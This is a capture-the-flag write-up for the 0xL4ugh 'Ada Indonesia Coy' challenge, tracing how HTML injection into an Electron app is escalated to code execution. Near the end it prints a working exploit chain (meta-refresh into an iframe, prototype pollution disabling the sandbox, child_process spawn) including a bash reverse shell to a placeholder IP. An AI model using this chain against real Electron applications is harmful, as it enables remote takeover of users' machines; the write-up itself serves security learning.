# Ada Indonesia Coy

## Description

'Ada Indonesia Coy' just made an Electron web app with their logo on it. It has anti-pwn protection, but can you still pwn it?

Source: [https://master-platform-bucket.s3.amazonaws.com/challenges/c368573e-38ba-4dcd-b8e7-e1ac349f6170/public.zip](https://master-platform-bucket.s3.amazonaws.com/challenges/c368573e-38ba-4dcd-b8e7-e1ac349f6170/public.zip)

## Solution

![Ada.png](/assets/ctf/0xl4ugh/ada.png)

![Ada-1.png](/assets/ctf/0xl4ugh/ada-1.png)

Returns `Payload submitted successfully!`

So.. there's only 2 routes that are disclosed on frontend. Let's see what's going on in source code.

`Dockerfile`:
```bash
FROM node:latest as src-builder

WORKDIR /app/
COPY ./src/ /app/

RUN npm install
RUN npm run build

from node:latest as ui-builder

WORKDIR /app/
COPY ./ui/ /app/

RUN npm install
RUN npm run build

FROM node:latest

ENV XDG_CURRENT_DESKTOP XFCE

RUN apt-get -qqy update
RUN apt-get -qqy --no-install-recommends install libfuse2 libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libgtk-3-dev libasound2 libgbm1 fuse ca-certificates
RUN apt-get -qqy --no-install-recommends install xvfb
RUN apt-get -qqy --no-install-recommends install xfce4
RUN rm -rf /var/lib/apt/lists/* /var/cache/apt/*

RUN useradd ctf --create-home
ENV DISPLAY=:0

WORKDIR /app

COPY --from=ui-builder /app/.next/standalone/ /app/
COPY --from=ui-builder /app/.next/static /app/.next/static

COPY --from=src-builder /app/dist/baby-electron-* /bin/baby-electron

COPY ./flag.txt /root/flag.txt
COPY ./readflag /readflag
RUN chmod 711 /readflag
RUN chmod u+s /readflag

EXPOSE 3000
CMD ["bash","-c","Xvfb :0 -screen 0 640x400x8 -nolisten tcp & runuser -u ctf -- node /app/server.js"]
```

Dockerfile seems to be emulating screen? (wtf?)  I guess it's expected since we were told it's Electron application.

`Ada Indonesia Coy/ui/src/app/api/payload/route.ts` is using subprocess to run our payload.
```js
import { spawn } from "child_process";

export async function POST(req: Request) {
    try {
        const { payload } = await req.json();
        if (typeof payload === "string") {
            const childProcess = spawn("baby-electron", [payload], { timeout: 1 * 30 * 1000 });
            childProcess.stdout.on('data', (data: any) => { console.log(`stdout: ${data}`); });
            childProcess.stderr.on('data', (data: any) => { console.error(`stderr: ${data}`); });
            childProcess.on('close', (code: any) => { console.log(`child process exited with code ${code}`); });
            return Response.json({ message: "Payload received successfully." });
        } else {
            return Response.json({ message: "Payload must be a string" }, { status: 400 });
        }
    } catch (error) {
        console.error(error);
        return Response.json({ error: "Internal server error." }, { status: 500 });
    }
}
```

To clarify thing I wanted to see what the hell was happening, so I just compiled the electron app itself.
```powershell
➜ pwd

Path
----
C:\Users\pvpga\VBoxShare\Ada Indonesia Coy\src
➜ npm i .
npm warn deprecated inflight@1.0.6: This module is not supported, and leaks memory. Do not use it. Check out lru-cache if you want a good and tested way to coalesce async requests by a key value, which is much more comprehensive and powerful.
npm warn deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
npm warn deprecated boolean@3.2.0: Package no longer supported. Contact Support at https://www.npmjs.com/support for more info.

added 300 packages, and audited 301 packages in 2m

44 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
➜ npm run start

> baby-electron@24.6.4 start
> electron .

embed .
```

![Ada-2.png](/assets/ctf/0xl4ugh/ada-2.png)

Hmm... `nodeIntegration` is set to `false` meaning no code execution via NodeJS (I think)

![Ada-3.png](/assets/ctf/0xl4ugh/ada-3.png)

Our payload which we passed in frontend is getting passed to Electron as `embed` and then it ends up inside Electron App as HTML code.

![Ada-4.png](/assets/ctf/0xl4ugh/ada-4.png)

We ideally want to get code execution, because challenge has a (SUID) binary `/readflag` which reads the flag for us.

```bash
➜ npm run build
➜ .\dist\win-unpacked\baby-electron.exe '<h1 style="color:red;">LetMeIn</h1>'
embed <h1 style=color:red;>LetMeIn</h1>
```

![Ada-5.png](/assets/ctf/0xl4ugh/ada-5.png)

Okkk.... we can inject any arbitrary html code we want

> **Note**: `fullscreen: false` property was changed from `true` to `false` to make debug easier.

Seems promising! [https://x.com/XssPayloads/status/1794627101892759809](https://x.com/XssPayloads/status/1794627101892759809)

![Ada-6.png](/assets/ctf/0xl4ugh/ada-6.png)

[Disabling nodeintegration can be bypassed by loading remote scripts in Preload #5173](https://github.com/electron/electron/issues/5173)

webview tag is disabled by default and it's not enabled in config; [https://www.electronjs.org/docs/latest/api/webview-tag](https://www.electronjs.org/docs/latest/api/webview-tag)

Not sure if this will be helpful or not, but if we redirect outside localhost (file://) we are able to access `createNoteFrame` function 🤔

```js
const electron = require("electron")
async function createNoteFrame(html, time) {
    const note = document.createElement("iframe")
    note.frameBorder = false
    note.height = "250px"
    note.srcdoc = "<dialog id='dialog'>" + html + "</dialog>"
    note.sandbox = 'allow-same-origin'
    note.onload = (ev) => {
        const dialog = new Proxy(ev.target.contentWindow.dialog, {
            get: (target, prop) => {
                const res = target[prop];
                return typeof res === "function" ? res.bind(target) : res;
            },
        })
        setInterval(dialog.close, time / 2);
        setInterval(dialog.showModal, time);
    }
    return note
}

class api {
    getConfig(){   return electron.ipcRenderer.invoke("get-config") }
    setConfig(conf, obj){ electron.ipcRenderer.invoke("set-config", conf, obj) }
    window(){             electron.ipcRenderer.invoke("get-window") }
}

window.api = new api()

document.addEventListener("DOMContentLoaded", async () => {
    if (document.location.origin !== "file://") {
        document.write(`<!DOCTYPE html><html><head><meta charset="UTF-8" /><title>Hati Hati!</title><style> body { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: skyblue;} h1 { text-align: center; color: white; } </style></head><body></body></html>`)
        const header = document.createElement("h1")
        header.setHTML("Palang Darurat")
        document.body.appendChild(header)
        const mynote = await createNoteFrame("<h1>Hati Hati!</h1><p>Website " + decodeURIComponent(document.location) + " Kemungkinan Berbahaya!</p>", 1000)
        document.body.appendChild(mynote)
    } else {
        const embed = (await window.api.getConfig()).embed
        document.getElementById("embed").setHTML("<h1>"+embed+"</h1>")
    }
})
```

![Ada Indonesia Coy.png](/assets/ctf/0xl4ugh/ada-indonesia-coy.png)

While reading [HackTricks: Electron Desktop Apps](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps) I noticed there's Tools section, so why not run a security check for more information?
```powershell
➜ npm install @doyensec/electronegativity -g
➜ cd '.\VBoxShare\Ada Indonesia Coy\src\'
➜ electronegativity -i .
```

![Ada Indonesia Coy-1.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-1.png)

The only access to `electron` object is via `ipc` called `api`

![Ada Indonesia Coy-2.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-2.png)

We can `getConfig` and `setConfig`. `setConfig` only allows accessing **keys** which exist inside `config` object; we can access `embed`, but not some imaginary `x`. 

![Ada Indonesia Coy-3.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-3.png)

Another thing we have access to is `__proto__`, but JS isn't playing nice and I'm not able to influence it so far.

Prototype Pollution is effected on some degree, but that's all... no assignment yet.

![Ada Indonesia Coy-4.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-4.png)

Good talk: [Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov)

I somewhat gave up on this route, because access seems not possible in this scenario. My idea behind this was to maybe hijack `preload` location and replace with rogue preload for RCE.

[Black Hat USA 2022](https://www.youtube.com/playlist?list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq) -> [ElectroVolt: Pwning Popular Desktop Apps While Uncovering New Attack Surface on Electron](https://youtu.be/Tzo8ucHA5xw?list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&t=1118)

First scenario described fits our case; `sandbox` ~~is~~ should have been disabled, but scratch that.

From [Docs](https://www.electronjs.org/docs/latest/tutorial/sandbox#:~:text=Starting%20from%20Electron%2020%2C%20the,for%20a%20single%20process%20section.): Starting from **Electron 20**, the sandbox is enabled for renderer processes without any further configuration. If you want to disable the sandbox for a process, see the [Disabling the sandbox for a single process](https://www.electronjs.org/docs/latest/tutorial/sandbox#disabling-the-sandbox-for-a-single-process) section.

![Ada Indonesia Coy-5.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-5.png)

Source code for this path can be found in open source github repo: [https://github1s.com/electron/electron/blob/main/lib/common/api/shell.ts](https://github1s.com/electron/electron/blob/main/lib/common/api/shell.ts)

Unfortunately for us `__webpack_require__` doesn't exist right out of the box.

Shown PoC to acquire this object fails
```html
<script>
  const origEndWith = String.prototype.endsWith;
  String.prototype.endsWith = function(...args) {
    if (args && args[0] === "/electron") {
      String.prototype.endsWith = origEndWith;
      return true;
    }
    return origEndWith.apply(this, args);
  }

  const origCallMethod = Function.prototype.call;
  Function.prototype.call = function(...args){
    if(args[3] && args[3].name === "__webpack_require__") {
      window.__webpack_require__ = args[3];
      Function.prototype.call = origCallMethod;
    }
    return origCallMethod.apply(this, args);
  }
  console.log(window.__webpack_require__);
</script>
```

```powershell
➜ .\dist\win-unpacked\baby-electron.exe "<script>eval(atob('Y29uc3Qgb3JpZ0VuZFdpdGggPSBTdHJpbmcucHJvdG90eXBlLmVuZHNXaXRoOw0KICBTdHJpbmcucHJvdG90eXBlLmVuZHNXaXRoID0gZnVuY3Rpb24oLi4uYXJncykgew0KICAgIGlmIChhcmdzICYmIGFyZ3NbMF0gPT09ICIvZWxlY3Ryb24iKSB7DQogICAgICBTdHJpbmcucHJvdG90eXBlLmVuZHNXaXRoID0gb3JpZ0VuZFdpdGg7DQogICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcmV0dXJuIG9yaWdFbmRXaXRoLmFwcGx5KHRoaXMsIGFyZ3MpOw0KICB9DQoNCiAgY29uc3Qgb3JpZ0NhbGxNZXRob2QgPSBGdW5jdGlvbi5wcm90b3R5cGUuY2FsbDsNCiAgRnVuY3Rpb24ucHJvdG90eXBlLmNhbGwgPSBmdW5jdGlvbiguLi5hcmdzKXsNCiAgICBpZihhcmdzWzNdICYmIGFyZ3NbM10ubmFtZSA9PT0gIl9fd2VicGFja19yZXF1aXJlX18iKSB7DQogICAgICB3aW5kb3cuX193ZWJwYWNrX3JlcXVpcmVfXyA9IGFyZ3NbM107DQogICAgICBGdW5jdGlvbi5wcm90b3R5cGUuY2FsbCA9IG9yaWdDYWxsTWV0aG9kOw0KICAgIH0NCiAgICByZXR1cm4gb3JpZ0NhbGxNZXRob2QuYXBwbHkodGhpcywgYXJncyk7DQogIH0NCiAgY29uc29sZS5sb2cod2luZG93Ll9fd2VicGFja19yZXF1aXJlX18pOyA='))</script>"
...
> __webpack_require__
VM19:1 Uncaught ReferenceError: __webpack_require__ is not defined at <anonymous>:1:1
```

> Btw [https://www.ctfiot.com/72313.html](https://www.ctfiot.com/72313.html) goes over the presentation but in text format.

> PDF: [https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf](https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf)

[X Et Et Challenge Writeup (TETCTF 2024)](https://hackmd.io/@Solderet/HJ52F9496) has a similar approach to exploit and what do you know, it's the author of the exploit.

![Ada Indonesia Coy-6.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-6.png)

At this point competition is done and there's only 2 PoC, no writeups. Above is from creator and second from another player.

![Ada Indonesia Coy-7.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-7.png)

The exploit seems to revolve around this piece of code:

![Ada Indonesia Coy-8.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-8.png)

Whenever we redirect we pop this note frame, and in there we can pass second XSS payload and gain RCE by disabling sandbox. That's the high level overview at least; I wanted to dive deeper, but not enough time.

Previously hint was dropped about `setInterval` being safe or not

![Ada Indonesia Coy-9.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-9.png)

TIL, there are not...: [Are setTimeout and setInterval secure? #shorts](https://youtu.be/XnKjPMXf33I)

![Ada Indonesia Coy-10.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-10.png)

Anyway let's test the PoC:
```html
<meta http-equiv="refresh" content="0; url=https://example.com#%3Ciframe%20name=%22dialog%22%20srcdoc=%22&lt;a%20id='showModal'%20href='javascript:Object.defineProperty(Object.prototype,`./lib/renderer/api/ipc-renderer.ts`,{set(v){console.log(`set`,v);try{this.module.exports._load(`child_process`).spawn(`calc.exe`)}catch(e){}}});api.setConfig(`__proto__`,{sandbox:false});api.window();'%3E&lt;/a%3E%22%3E%3C/iframe%3E%0A">
```

For local testing (Windows) I used `calc` for better visual

![Ada Indonesia Coy-11.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-11.png)

The hosted application is served by Docker on Linux, so let's adjust payload like given by author.

```html
<meta http-equiv="refresh" content="0; url=https://example.com#%3Ciframe%20name=%22dialog%22%20srcdoc=%22&lt;a%20id='showModal'%20href='cid:Object.defineProperty(Object.prototype,`./lib/renderer/api/ipc-renderer.ts`,{set(v){console.log(`set`,v);try{this.module.exports._load(`child_process`).spawn(`bash`, [`-c`,`sh -i >& /dev/tcp/IP/4444 0>&1`])}catch(e){}}});api.setConfig(`__proto__`,{sandbox:false});api.window();'%3E&lt;/a%3E%22%3E%3C/iframe%3E%0A">
```

Payload decompiled~
```html
<!-- PAYLOAD= -->
<meta http-equiv="refresh" content="0; url=https://example.com#<iframe name="dialog" srcdoc="SRCDOC"></iframe>">

<!-- SRCDOC= -->
<a id="showModal" href="cid:HREF"></a>

<!-- HREF= -->
<script> 
    Object.defineProperty(
        Object.prototype,
        `./lib/renderer/api/ipc-renderer.ts`,
        {
            set(v) {
                console.log(`set`, v);
                try {
                    this.module.exports
                        ._load(`child_process`)
                        .spawn(`bash`, [
                            `-c`,
                            `sh -i >& /dev/tcp/IP/4444 0>&1`,
                        ]);
                } catch (e) {}
            },
        }
    );
    api.setConfig(`__proto__`, { sandbox: false });
    api.window();
</script>
```

> Not sure what `cid:` stands for in `href`, but it's almost same as `javascript:`

Just my luck, resources are no longer able to be spawned.

![Ada Indonesia Coy-12.png](/assets/ctf/0xl4ugh/ada-indonesia-coy-12.png)

RIP Flag

